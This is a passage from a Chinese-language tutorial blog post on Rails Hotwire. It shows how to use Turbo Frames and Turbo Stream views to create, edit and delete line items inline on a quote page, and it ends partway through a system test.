<span class="token comment"># => line_item_date_1_line_items</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 现在使用我们的新的约定来修改视图</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item_date <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item-date"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__body"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item line-item--header"</span></span><span class="token operator">></span>
        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

      <span class="token operator">&lt;</span><span class="token operator">%=</span> render line_item_date<span class="token punctuation">.</span>line_items<span class="token punctuation">,</span> <span class="token symbol">quote</span><span class="token operator">:</span> quote<span class="token punctuation">,</span> <span class="token symbol">line_item_date</span><span class="token operator">:</span> line_item_date <span class="token string-literal"><span class="token string">%>

      &lt;%= turbo_frame_tag nested_dom_id(line_item_date, LineItem.new) %></span></span>

      <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"line-item-date__footer"</span></span><span class="token operator">></span>
        <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Add item"</span></span><span class="token punctuation">,</span>
                    <span class="token punctuation">[</span><span class="token symbol">:new</span><span class="token punctuation">,</span> quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> <span class="token symbol">:line_item</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                    <span class="token symbol">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token symbol">turbo_frame</span><span class="token operator">:</span> nested_dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">,</span> <span class="token class-name">LineItem</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                    <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--primary"</span></span> <span class="token string-literal"><span class="token string">%>
      &lt;/div></span></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>Quotes#show</code>页面，我们的Turbo Frames已经有了想要的ids，我们需要<code>LineItems#new</code>页面去匹配Turbo Frames，为了能够进行替换，让我们把表单嵌套到Turbo Frame tag中吧。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/new.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>New item <span class="token keyword">for</span> <span class="token operator">&lt;</span><span class="token operator">%=</span> l<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">.</span>date<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>&lt;/h1></span></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag nested_dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token class-name">LineItem</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render "form",
              quote: @quote,
              line_item_date: @line_item_date,
              line_item: @line_item %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中试试吧，当点击”Add item”按钮时，表单会出现在指定日期的正确的位置上。</p>
<p>和前面的章节一样，当我们提交一个无效的表单时，错误会如预期的那样出现在页面上。</p>
<p> 我们需要给Turbo更精确的指令当提交一个正常的表单， 通过Turbo Stream view，我们希望做到以下两点：</p>
<ol>
<li>删除DOM中的表单</li>
<li>添加新建的Line item到具体日期下Line items列表中</li>
</ol>
<p>让我们修改<code>LineItemsController#create</code>去响应<code>turbo_stream</code> format</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_items_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">LineItemsController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code...</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@line_item</span> <span class="token operator">=</span> <span class="token variable">@line_item_date</span><span class="token punctuation">.</span>line_items<span class="token punctuation">.</span>build<span class="token punctuation">(</span>line_item_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@line_item</span><span class="token punctuation">.</span>save
      respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
        format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Item was successfully created."</span></span> <span class="token punctuation">&#125;</span>
        format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Item was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      <span class="token keyword">end</span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 让我们创建我们的试图，来执行期望的行为</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/line_items/create.turbo_stream.erb %>

&lt;%#</span></span> Step <span class="token number">1</span><span class="token operator">:</span> empty the Turbo Frame containing the form <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream.update nested_dom_id(@line_item_date, LineItem.new), "" %></span></span>

<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># Step 2: append the created line item to the list %></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>append nested_dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"line_items"</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= render @line_item, quote: @quote, line_item_date: @line_item_date %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后一件事儿就是我们想要用Turbo Frame去嵌套line items列表，为每一个具体的日期。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag nested_dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"line_items"</span></span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= render line_item_date.line_items, quote: quote, line_item_date: line_item_date %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;!-- All the previous code --></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中试试看，所有工作都能正产运转，下面就剩<code>#edit,#update,#destroy</code></p>
<h3 id="Updating-line-items-with-Turbo"><a href="#Updating-line-items-with-Turbo" class="headerlink" title="Updating line items with Turbo"></a>Updating line items with Turbo</h3><p>像刚刚<code>#new and #create</code>一样，我们也希望<code>#edit and #update</code>也在<code>Quotes#show</code>页面操作，尽管我们已经有了需要的大部分的Turbo Frames，不过我们还需要将每一个line item嵌套到Turbo Frame，如下面草图所示：</p>
<p><img src="../../../../public/img/image-20230701101156669.png" alt="image-20230701101156669"></p>
<p>当我们点击”Edit”到被嵌套到id为<code>line_item_2</code>的Turbo Frame的第二条line item时，Turbo希望能在<code>LineItems#edit</code>也页面中找到相同id的Turbo Frame，如下图所示</p>
<p><img src="../../../../public/img/image-20230701101429630.png" alt="image-20230701101429630"></p>
<p>这样当点击一个line item时，Turbo就能用<code>LineItem#edit</code>页面的表单去替换这条line item.</p>
<p><img src="../../../../public/img/image-20230701101632162.png" alt="image-20230701101632162"></p>
<p>当提交表单时，我们希望最终的数据能再替换表单</p>
<p><img src="../../../../public/img/image-20230701101714652.png" alt="image-20230701101714652"></p>
<p>现在需求已经明确了，该敲代码了，首先是让edit表单成功的替换<code>Quotes#show</code>页面line items的HTML，为此，我们将每个item嵌套到Turbo Frame中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_line_item.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们需要删掉”Edit”链接中的<code>data-turbo-frame=&quot;_top&quot;</code>参数</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_line_item.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Edit"</span></span><span class="token punctuation">,</span>
            <span class="token punctuation">[</span><span class="token symbol">:edit</span><span class="token punctuation">,</span> quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> line_item<span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
&lt;!-- All the previous code --></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们需要把line items都嵌套到Turbo Frames，我们也需要把<code>LineItems#edit</code>页面的表单嵌套到Turbo Frame中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/edit.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Edit item<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag <span class="token variable">@line_item</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render "form",
              quote: @quote,
              line_item_date: @line_item_date,
              line_item: @line_item %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中试试看，当点解line item的”Edit”按钮时，表单成功的替换到了<code>Quotes#show</code>页面</p>
<p>如果我们提交一个异常数据，也能正常运转。</p>
<p>而提交一个正常数据时，数据被成功更新，但是缺少了flash message，为此，我们需要使用一个Turbo Stream view,首先让我们的Controller允许渲染Turbo Stream view:</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_items_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
  <span class="token keyword">if</span> <span class="token variable">@line_item</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>line_item_params<span class="token punctuation">)</span>
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Item was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Item was successfully updated."</span></span> <span class="token punctuation">&#125;</span>
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在创建<code>update.turbo_stream.erb</code>view去让line item的局部模版替换掉表单，并渲染flash message。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/update.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>replace <span class="token variable">@line_item</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;%= render @line_item, quote: @quote, line_item_date: @line_item_date %></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>

&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去浏览器中试试看，完美</p>
<h3 id="Destroying-line-items-with-Turbo"><a href="#Destroying-line-items-with-Turbo" class="headerlink" title="Destroying line items with Turbo"></a>Destroying line items with Turbo</h3><p>最后一点，我们需要能够删除line Items，为此，我们需要让<code>#destroy</code>支持Turbo Stream format</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/line_items_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
  <span class="token variable">@line_item</span><span class="token punctuation">.</span>destroy

  respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
    format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Date was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
    format<span class="token punctuation">.</span>turbo_stream <span class="token punctuation">&#123;</span> flash<span class="token punctuation">.</span>now<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Date was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这个view中，我们只需要删除对应的line item并渲染flash message即可。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/destroy.turbo_stream.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_stream<span class="token punctuation">.</span>remove <span class="token variable">@line_item</span> <span class="token string-literal"><span class="token string">%>
&lt;%= render_turbo_stream_flash_messages %></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>记着不要忘了删除”Delete”按钮中的<code>data-turbo-frame=&quot;_top&quot;</code>参数</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_items/_line_item.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span>
              <span class="token punctuation">[</span>quote<span class="token punctuation">,</span> line_item_date<span class="token punctuation">,</span> line_item<span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
              <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--light"</span></span> <span class="token string-literal"><span class="token string">%>
&lt;!-- All the previous code --></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们最终在浏览器中测试一下</p>
<h3 id="Editing-line-item-dates-with-Turbo"><a href="#Editing-line-item-dates-with-Turbo" class="headerlink" title="Editing line item dates with Turbo"></a>Editing line item dates with Turbo</h3><p>关于line items的所有操作都完成了，但有个小问题：当点击line item date的”Edit”链接时，整个line item date card都被edit表单替换掉了，我们只希望整个card的头部，包含日期的部分被替换带。</p>
<p>让每位将line item date的头部嵌套到Turbo Frame中，通过以”edit”为前缀的dom_id进行唯一标识</p>
<p><img src="../../../../public/img/image-20230701103957240.png" alt="image-20230701103957240"></p>
<p>为了能让Turbo去替换这部分，我们要在<code>LineItemDates#edit</code>页面中使用相同的id</p>
<p><img src="../../../../public/img/image-20230701104106437.png" alt="image-20230701104106437"></p>
<p>这样当点击特定日期的”Edit”按钮时，Turbo只会替换line item date card的头部</p>
<p><img src="../../../../public/img/image-20230701104201719.png" alt="image-20230701104201719"></p>
<p>现在需求明确了，开始敲代码吧，首先在line item date的局部模版中，添加以”edit”为前缀的Turbo Frame id。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/_line_item_date.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag line_item_date <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="line-item-date"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag dom_id<span class="token punctuation">(</span>line_item_date<span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
      &lt;div class="line-item-date__header"></span></span>
        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
    &lt;div class="line-item-date__body"></span></span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the previous code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们也需要修改<code>LineItemDates#edit</code>页面。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/line_item_dates/edit.html.erb %></span>

<span class="token operator">&lt;</span>main <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"container"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to sanitize<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"&amp;larr; Back to quote"</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span> quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span> <span class="token string-literal"><span class="token string">%>

  &lt;div class="header"></span></span>
    <span class="token operator">&lt;</span>h1<span class="token operator">></span>Edit date<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>

  <span class="token operator">&lt;</span><span class="token operator">%=</span> turbo_frame_tag dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token string-literal"><span class="token string">%>
    &lt;%= render "form", quote: @quote, line_item_date: @line_item_date %></span></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token string-literal"><span class="token string">%>
&lt;/main></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在浏览器中试试吧，当点击edit链接时，只有card头部被替换。</p>
<h2 id="Preserving-state-with-Turbo-Rails"><a href="#Preserving-state-with-Turbo-Rails" class="headerlink" title="Preserving state with Turbo Rails"></a>Preserving state with Turbo Rails</h2><p>到目前为止，我们通过使页面的各个部分真正独立来始终保持应用程序的状态。但是，在我们的应用程序中有一个小故障。</p>
<p>为了演示这个问题，让我们来到第一个quote的<code>Quotes#show</code>页面，并通过点击第一个<code>line item  date</code>多个line items的”Edit”按钮，来打开多个表单。然后当我们更新第一个line item date时，所有的表单都再次消失。</p>
<p>这是因为为了保证我们的日期能正向排序，我们完全删除了DOM中的line item date card,将其重新附加到列表中的正确位置,为此我们也就丢失了日期内line item的状态，因为默认情况下渲染的局部页面的表单都是关闭。</p>
<p>这里就是当我们只使用Turbo Rails，而不使用自定义JavaScript时遇到的瓶颈，如果你想在更新<code>line item date</code>保留<code>Quotes#show</code>页面的状态，我们有两种解决方案：</p>
<ul>
<li>使用Turbo Stream format时不进行排序</li>
<li>使用Stimulus控制器重新排序前端中的项目</li>
</ul>
<p>尽管这是一个小故障，但知道Turbo的局限性也是很重要的，在本教程中，我们将简单的忽略此故障。</p>
<h2 id="Testing-our-code-with-system-tests"><a href="#Testing-our-code-with-system-tests" class="headerlink" title="Testing our code with system tests"></a>Testing our code with system tests</h2><p>如果不添加测试，我们的工作是不完整的。</p>
<p>让我们添加<code>line items</code>的增删改查的系统测试</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/line_items_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">LineItemSystemTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  <span class="token keyword">include</span> ActionView<span class="token double-colon punctuation">::</span>Helpers<span class="token double-colon punctuation">::</span>NumberHelper

  setup <span class="token keyword">do</span>
    login_as users<span class="token punctuation">(</span><span class="token symbol">:accountant</span><span class="token punctuation">)</span>

    <span class="token variable">@quote</span>          <span class="token operator">=</span> quotes<span class="token punctuation">(</span><span class="token symbol">:first</span><span class="token punctuation">)</span>
    <span class="token variable">@line_item_date</span> <span class="token operator">=</span> line_item_dates<span class="token punctuation">(</span><span class="token symbol">:today</span><span class="token punctuation">)</span>
    <span class="token variable">@line_item</span>      <span class="token operator">=</span> line_items<span class="token punctuation">(</span><span class="token symbol">:room_today</span><span class="token punctuation">)</span>

    visit quote_path<span class="token punctuation">(</span><span class="token variable">@quote</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Creating a new line item"</span></span> <span class="token keyword">do</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    within <span class="token string-literal"><span class="token string">"#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
      click_on <span class="token string-literal"><span class="token string">"Add item"</span></span><span class="token punctuation">,</span> <span class="token symbol">match</span><span class="token operator">:</span> <span class="token symbol">:first</span>
    <span class="token keyword">end</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Animation"</span></span>
    fill_in <span class="token string-literal"><span class="token string">"Quantity"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token number">1</span>
